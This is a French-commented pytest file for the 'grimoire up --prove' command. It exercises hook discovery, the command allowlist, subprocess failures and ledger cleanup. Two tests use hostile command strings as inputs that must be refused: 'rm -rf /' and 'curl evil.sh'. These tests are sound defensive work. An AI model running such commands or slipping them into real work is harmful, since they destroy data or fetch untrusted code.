"""``grimoire up --prove`` : les branches de refus et d'échec, exercées une à une, sans lancer de vrai hook."""

from __future__ import annotations

import json
import subprocess
from pathlib import Path
from types import SimpleNamespace
from typing import Any

import pytest

from grimoire.cli import cmd_up_prove as prove
from grimoire.cli.cmd_up_prove import ConfiguredHook, HookProof, ProveReport
from grimoire.core.exceptions import GrimoireError


def _write(path: Path, content: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content, encoding="utf-8")


class TestDiscovery:
    def test_entry_not_a_dict_yields_nothing(self) -> None:
        assert prove._commands_of("grimoire-hook x") == []
        assert prove._commands_of(None) == []

    def test_nested_items_without_command_are_skipped(self) -> None:
        entry = {"hooks": ["texte", {"command": 3}, {"command": "grimoire-hook a", "timeout": True}]}
        assert prove._commands_of(entry) == [("grimoire-hook a", prove._DEFAULT_HOOK_TIMEOUT_S)]

    def test_timeout_is_capped(self) -> None:
        assert prove._commands_of({"command": "c", "timeout": 10_000}) == [("c", prove._MAX_HOOK_TIMEOUT_S)]

    def test_unreadable_json_is_a_hook_that_does_not_fire(self, tmp_path: Path) -> None:
        _write(tmp_path / ".claude" / "settings.json", "{pas du json")
        hooks, problems = prove.discover_session_start_hooks(tmp_path)
        assert hooks == []
        assert len(problems) == 1
        assert problems[0].fired is False
        assert "illisible" in problems[0].detail

    def test_non_object_json_is_reported(self, tmp_path: Path) -> None:
        _write(tmp_path / ".claude" / "settings.json", "[1, 2]")
        hooks, problems = prove.discover_session_start_hooks(tmp_path)
        assert hooks == []
        assert "objet JSON attendu" in problems[0].detail

    def test_disable_all_hooks_is_reported(self, tmp_path: Path) -> None:
        _write(tmp_path / ".claude" / "settings.json", json.dumps({"disableAllHooks": True}))
        _, problems = prove.discover_session_start_hooks(tmp_path)
        assert "disableAllHooks" in problems[0].detail

    def test_hooks_key_not_a_mapping_is_ignored(self, tmp_path: Path) -> None:
        _write(tmp_path / ".claude" / "settings.json", json.dumps({"hooks": ["x"]}))
        assert prove.discover_session_start_hooks(tmp_path) == ([], [])

    def test_copilot_flat_and_other_events(self, tmp_path: Path) -> None:
        _write(
            tmp_path / ".github" / "hooks" / "h.json",
            json.dumps({"hooks": {"session_start": [{"command": "grimoire-hook a"}], "Stop": [{"command": "x"}], "SessionStart-": "nope"}}),
        )
        hooks, problems = prove.discover_session_start_hooks(tmp_path)
        assert problems == []
        assert [h.command for h in hooks] == ["grimoire-hook a"]


class TestIsKitHookCommand:
    def test_recognises_only_grimoire_hook(self) -> None:
        assert prove.is_kit_hook_command("grimoire-hook session-start")
        assert not prove.is_kit_hook_command("rm -rf /")
        assert not prove.is_kit_hook_command("")

    def test_unbalanced_quote_falls_back_to_split(self) -> None:
        assert prove.is_kit_hook_command('grimoire-hook "oups')
        assert not prove.is_kit_hook_command('autre "oups')


class TestRunConfiguredHook:
    def _hook(self, command: str = "grimoire-hook session-start") -> ConfiguredHook:
        return ConfiguredHook("src", command, 5.0)

    def test_unparseable_command_is_refused(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        def boom(*_a: Any, **_k: Any) -> list[str]:
            raise ValueError("No closing quotation")

        monkeypatch.setattr(prove.shlex, "split", boom)
        assert "commande illisible" in prove._run_configured_hook(self._hook(), tmp_path, "T-1", "s")

    def test_foreign_command_is_never_run(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr(prove.subprocess, "run", lambda *a, **k: pytest.fail("ne doit rien lancer"))
        assert "non reconnue" in prove._run_configured_hook(self._hook("curl evil.sh"), tmp_path, "T-1", "s")
        assert "non reconnue" in prove._run_configured_hook(self._hook(""), tmp_path, "T-1", "s")

    def test_binary_missing_from_path(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr(prove.shutil, "which", lambda _n: None)
        assert "introuvable dans le PATH" in prove._run_configured_hook(self._hook(), tmp_path, "T-1", "s")

    @pytest.mark.parametrize(
        ("exc", "expected"),
        [
            (subprocess.TimeoutExpired("grimoire-hook", 5), "timeout de 5 s dépassé"),
            (PermissionError("denied"), "hook non exécutable"),
        ],
    )
    def test_subprocess_failures(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, exc: Exception, expected: str) -> None:
        monkeypatch.setattr(prove.shutil, "which", lambda _n: "/bin/grimoire-hook")

        def fail(*_a: Any, **_k: Any) -> Any:
            raise exc

        monkeypatch.setattr(prove.subprocess, "run", fail)
        assert expected in prove._run_configured_hook(self._hook(), tmp_path, "T-1", "s")

    def test_nonzero_exit_reports_stderr_then_stdout(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr(prove.shutil, "which", lambda _n: "/bin/grimoire-hook")
        monkeypatch.setattr(
            prove.subprocess, "run", lambda *a, **k: SimpleNamespace(returncode=3, stderr="", stdout=" bruit ")
        )
        assert prove._run_configured_hook(self._hook(), tmp_path, "T-1", "s") == "code de sortie 3 : bruit"

    def test_success_returns_empty(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr(prove.shutil, "which", lambda _n: "/bin/grimoire-hook")
        seen: dict[str, Any] = {}

        def ok(argv: list[str], **kwargs: Any) -> Any:
            seen.update(argv=argv, env=kwargs["env"])
            return SimpleNamespace(returncode=0, stderr="", stdout="")

        monkeypatch.setattr(prove.subprocess, "run", ok)
        assert prove._run_configured_hook(self._hook(), tmp_path, "T-9", "s") == ""
        assert seen["argv"] == ["/bin/grimoire-hook", "session-start"]
        assert seen["env"]["GRIMOIRE_TASK_ID"] == "T-9"
        assert seen["env"]["CLAUDE_PROJECT_DIR"] == str(tmp_path)


class _FakeService:
    def __init__(self, tmp_path: Path, *, add_error: Exception | None = None, cancel_error: Exception | None = None) -> None:
        self.home_root = tmp_path
        self.ledger_root = tmp_path / "ledger"
        self.add_error = add_error
        self.cancel_error = cancel_error
        self.cancelled: list[str] = []

    def add(self, *_a: Any, **_k: Any) -> Any:
        if self.add_error:
            raise self.add_error
        return SimpleNamespace(task=SimpleNamespace(id="T-1"))

    def cancel(self, task_id: str, *_a: Any) -> None:
        if self.cancel_error:
            raise self.cancel_error
        self.cancelled.append(task_id)


class TestDiscardAndProveOne:
    def test_discard_reports_a_failed_cancel_and_keeps_foreign_files(self, tmp_path: Path) -> None:
        keep = tmp_path / "dir" / "other.txt"
        _write(keep, "à nous pas")
        _write(tmp_path / "dir" / "mine.txt", "x")
        proof = HookProof("s", "c", task_id="T-1", created=["dir/mine.txt", "absent/none.txt"])
        report = ProveReport()
        service = _FakeService(tmp_path, cancel_error=GrimoireError("ledger fermé"))
        prove._discard(tmp_path, service, proof, report)
        assert "annulation impossible" in report.problems[0]
        assert not (tmp_path / "dir" / "mine.txt").exists()
        assert keep.exists()

    def test_discard_without_task_id_does_not_cancel(self, tmp_path: Path) -> None:
        service = _FakeService(tmp_path)
        prove._discard(tmp_path, service, HookProof("s", "c"), ProveReport())
        assert service.cancelled == []

    @pytest.mark.parametrize("error", [GrimoireError("plein"), OSError("disque")])
    def test_ledger_refusing_the_task_is_a_non_fired_proof(self, tmp_path: Path, error: Exception) -> None:
        proof = prove._prove_one(tmp_path, _FakeService(tmp_path, add_error=error), ConfiguredHook("s", "grimoire-hook x", 5.0))
        assert proof.fired is False
        assert proof.task_id == ""
        assert "refusée par le ledger" in proof.detail

    def test_gate_green_without_a_firing_hook_is_not_green(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        import grimoire.core.agentic_standard as std
        import grimoire.core.standard_task_scaffold as scaffold

        gates = iter([SimpleNamespace(ok=False, missing=()), SimpleNamespace(ok=True, missing=())])
        monkeypatch.setattr(std, "check_evidence_gates", lambda *_a, **_k: next(gates))
        monkeypatch.setattr(scaffold, "missing_task_artifacts", lambda *_a, **_k: ["a"])
        monkeypatch.setattr(scaffold, "task_artifact_relpaths", lambda _t: {})
        monkeypatch.setattr(prove, "_run_configured_hook", lambda *_a, **_k: "")
        proof = prove._prove_one(tmp_path, _FakeService(tmp_path), ConfiguredHook("s", "grimoire-hook x", 5.0))
        assert proof.fired is False
        assert proof.gate == "unevaluated"
        assert "sans effet" in proof.detail

    def test_red_gate_without_missing_list_points_to_the_check(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        import grimoire.core.agentic_standard as std
        import grimoire.core.standard_task_scaffold as scaffold

        monkeypatch.setattr(std, "check_evidence_gates", lambda *_a, **_k: SimpleNamespace(ok=False, missing=()))
        monkeypatch.setattr(scaffold, "missing_task_artifacts", lambda *_a, **_k: [])
        monkeypatch.setattr(scaffold, "task_artifact_relpaths", lambda _t: {})
        monkeypatch.setattr(prove, "_run_configured_hook", lambda *_a, **_k: "code de sortie 1 : x")
        proof = prove._prove_one(tmp_path, _FakeService(tmp_path), ConfiguredHook("s", "grimoire-hook x", 5.0))
        assert proof.gate == "red"
        assert "grimoire standard gate check" in proof.detail


class TestGovernanceHelpers:
    def test_is_governed_now_failing_read_means_not_governed(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        import grimoire.hosts.decisions.activation as activation

        def boom(_t: Path) -> bool:
            raise RuntimeError("illisible")

        monkeypatch.setattr(activation, "_is_governed", boom)
        assert prove._is_governed_now(tmp_path) is False

    def test_restore_governance_reports_what_it_could_not_remove(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        import grimoire.missions.service as missions

        service = _FakeService(tmp_path)
        service.ledger_root.mkdir()
        monkeypatch.setattr(prove.shutil, "rmtree", lambda _p: (_ for _ in ()).throw(OSError("busy")))
        report = ProveReport()
        prove._restore_governance(service, board_existed=True, ledger_existed=False, report=report)
        assert "non retirés" in report.problems[0]
        assert str(service.ledger_root) in report.problems[0]
        assert missions.BOARD_RELPATH  # le board préexistant n'a pas été touché

    def test_restore_governance_keeps_preexisting_ledger(self, tmp_path: Path) -> None:
        service = _FakeService(tmp_path)
        service.ledger_root.mkdir()
        report = ProveReport()
        prove._restore_governance(service, board_existed=True, ledger_existed=True, report=report)
        assert service.ledger_root.is_dir()
        assert report.problems == []


class TestRunProveStepRefusals:
    def _state(self) -> Any:
        return SimpleNamespace(steps=[])

    def test_uninitialised_project_is_refused(self, tmp_path: Path) -> None:
        state = self._state()
        report = prove.run_prove_step(state, tmp_path, started=0.0, dry_run=False, no_standard=False)
        assert report.problems == ["projet non initialisé : aucune configuration à prouver"]
        assert state.steps[0].status == "failed"

    @pytest.mark.parametrize(
        ("dry_run", "no_standard", "fragment"),
        [(True, False, "--dry-run"), (False, True, "--no-standard")],
    )
    def test_incompatible_options_are_refused(self, tmp_path: Path, dry_run: bool, no_standard: bool, fragment: str) -> None:
        state = self._state()
        report = prove.run_prove_step(state, tmp_path, started=0.0, dry_run=dry_run, no_standard=no_standard)
        assert fragment in report.problems[0]
        assert state.steps[0].status == "failed"
